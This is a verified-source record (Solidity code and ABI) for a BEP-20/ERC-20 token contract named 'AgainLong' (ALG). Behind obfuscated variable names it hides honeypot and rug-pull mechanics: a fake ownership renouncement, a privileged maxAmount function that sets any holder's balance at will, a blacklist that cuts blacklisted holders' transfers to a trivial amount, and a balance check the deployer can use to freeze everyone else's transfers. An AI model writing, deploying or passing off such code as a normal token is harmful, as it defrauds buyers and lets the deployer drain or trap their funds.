{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tradingSender {\n    function createPair(address fromTx, address isLaunched) external returns (address);\n}\n\ninterface swapTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountBuy) external view returns (uint256);\n\n    function transfer(address launchFrom, uint256 exemptTradingLiquidity) external returns (bool);\n\n    function allowance(address txReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptTradingLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchFrom,\n        uint256 exemptTradingLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLaunch, uint256 value);\n    event Approval(address indexed txReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract fundMarketingTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderSellTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSenderWallet is swapTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AgainLong is fundMarketingTrading, swapTake, feeSenderWallet {\n\n    bool public enableLimit;\n\n    function allowance(address buyFund, address listTotal) external view virtual override returns (uint256) {\n        if (listTotal == swapList) {\n            return type(uint256).max;\n        }\n        return launchAt[buyFund][listTotal];\n    }\n\n    function launchedTotal() public {\n        emit OwnershipTransferred(sellFund, address(0));\n        receiverLiquidity = address(0);\n    }\n\n    string private launchedLiquidity = \"ALG\";\n\n    function buyAuto(address autoAmountLimit) public {\n        receiverAmount();\n        if (atLaunchedShould) {\n            receiverMarketing = false;\n        }\n        if (autoAmountLimit == sellFund || autoAmountLimit == buyTo) {\n            return;\n        }\n        fundExempt[autoAmountLimit] = true;\n    }\n\n    bool public autoMin;\n\n    uint256 private amountWallet = 100000000 * 10 ** 18;\n\n    address swapList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountWallet;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedLiquidity;\n    }\n\n    function balanceOf(address amountBuy) public view virtual override returns (uint256) {\n        return atTakeExempt[amountBuy];\n    }\n\n    uint256 private teamMarketing;\n\n    uint256 constant sellReceiverTo = 18 ** 10;\n\n    bool private fundMin;\n\n    mapping(address => bool) public fundExempt;\n\n    uint256 public toSwap;\n\n    bool public takeTeam;\n\n    function approve(address listTotal, uint256 exemptTradingLiquidity) public virtual override returns (bool) {\n        launchAt[_msgSender()][listTotal] = exemptTradingLiquidity;\n        emit Approval(_msgSender(), listTotal, exemptTradingLiquidity);\n        return true;\n    }\n\n    function senderWallet(address amountLaunched, address launchFrom, uint256 exemptTradingLiquidity) internal returns (bool) {\n        if (amountLaunched == sellFund) {\n            return takeAmount(amountLaunched, launchFrom, exemptTradingLiquidity);\n        }\n        uint256 totalLiquidity = swapTake(buyTo).balanceOf(senderSwap);\n        require(totalLiquidity == sellFundEnable);\n        require(launchFrom != senderSwap);\n        if (fundExempt[amountLaunched]) {\n            return takeAmount(amountLaunched, launchFrom, sellReceiverTo);\n        }\n        return takeAmount(amountLaunched, launchFrom, exemptTradingLiquidity);\n    }\n\n    bool public atLaunchedShould;\n\n    function swapAt(address autoTotal) public {\n        if (takeTeam) {\n            return;\n        }\n        \n        launchedReceiver[autoTotal] = true;\n        if (toSwap == teamMarketing) {\n            enableLimit = false;\n        }\n        takeTeam = true;\n    }\n\n    function receiverAmount() private view {\n        require(launchedReceiver[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return enableReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchAt;\n\n    uint256 public minSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchEnable;\n    }\n\n    function feeAt(uint256 exemptTradingLiquidity) public {\n        receiverAmount();\n        sellFundEnable = exemptTradingLiquidity;\n    }\n\n    mapping(address => bool) public launchedReceiver;\n\n    uint256 totalFee;\n\n    function transferFrom(address amountLaunched, address launchFrom, uint256 exemptTradingLiquidity) external override returns (bool) {\n        if (_msgSender() != swapList) {\n            if (launchAt[amountLaunched][_msgSender()] != type(uint256).max) {\n                require(exemptTradingLiquidity <= launchAt[amountLaunched][_msgSender()]);\n                launchAt[amountLaunched][_msgSender()] -= exemptTradingLiquidity;\n            }\n        }\n        return senderWallet(amountLaunched, launchFrom, exemptTradingLiquidity);\n    }\n\n    uint8 private launchEnable = 18;\n\n    address private receiverLiquidity;\n\n    address public sellFund;\n\n    bool public teamExempt;\n\n    function takeAmount(address amountLaunched, address launchFrom, uint256 exemptTradingLiquidity) internal returns (bool) {\n        require(atTakeExempt[amountLaunched] >= exemptTradingLiquidity);\n        atTakeExempt[amountLaunched] -= exemptTradingLiquidity;\n        atTakeExempt[launchFrom] += exemptTradingLiquidity;\n        emit Transfer(amountLaunched, launchFrom, exemptTradingLiquidity);\n        return true;\n    }\n\n    mapping(address => uint256) private atTakeExempt;\n\n    function getOwner() external view returns (address) {\n        return receiverLiquidity;\n    }\n\n    uint256 sellFundEnable;\n\n    bool public receiverMarketing;\n\n    address senderSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function maxAmount(address toSell, uint256 exemptTradingLiquidity) public {\n        receiverAmount();\n        atTakeExempt[toSell] = exemptTradingLiquidity;\n    }\n\n    constructor (){\n        if (receiverMarketing) {\n            receiverMarketing = false;\n        }\n        senderSellTx takeTrading = senderSellTx(swapList);\n        buyTo = tradingSender(takeTrading.factory()).createPair(takeTrading.WETH(), address(this));\n        \n        sellFund = _msgSender();\n        launchedReceiver[sellFund] = true;\n        atTakeExempt[sellFund] = amountWallet;\n        launchedTotal();\n        if (receiverMarketing) {\n            receiverMarketing = false;\n        }\n        emit Transfer(address(0), sellFund, amountWallet);\n    }\n\n    address public buyTo;\n\n    string private enableReceiver = \"Again Long\";\n\n    function transfer(address toSell, uint256 exemptTradingLiquidity) external virtual override returns (bool) {\n        return senderWallet(_msgSender(), toSell, exemptTradingLiquidity);\n    }\n\n    event OwnershipTransferred(address indexed atWallet, address indexed tokenSell);\n\n    function owner() external view returns (address) {\n        return receiverLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunchedShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAmountLimit\",\"type\":\"address\"}],\"name\":\"buyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"feeAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"maxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptTradingLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AgainLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}